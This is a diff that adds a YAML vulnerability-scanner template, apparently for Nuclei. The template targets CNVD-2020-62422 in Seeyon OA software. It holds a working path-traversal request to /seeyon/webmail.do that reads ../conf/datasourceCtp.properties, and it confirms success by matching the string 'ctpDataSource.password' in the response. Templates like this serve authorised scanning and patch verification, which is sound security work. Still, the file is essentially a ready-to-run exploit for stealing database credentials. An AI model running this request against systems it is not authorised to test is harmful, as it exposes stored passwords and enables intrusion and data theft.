@@ -1,0 +1,25 @@
+id: poc-yaml-seeyon-cnvd-2020-62422-readfile
+
+info:
+  name: poc-yaml-seeyon-cnvd-2020-62422-readfile
+  author: Aquilao(https://github.com/Aquilao)
+  severity: high
+  tags: xray-converted,lfi,cnvd-2020-62422,ct-158869
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-62422
+
+http:
+  - raw:
+      - |
+        GET /seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ctpDataSource.password"
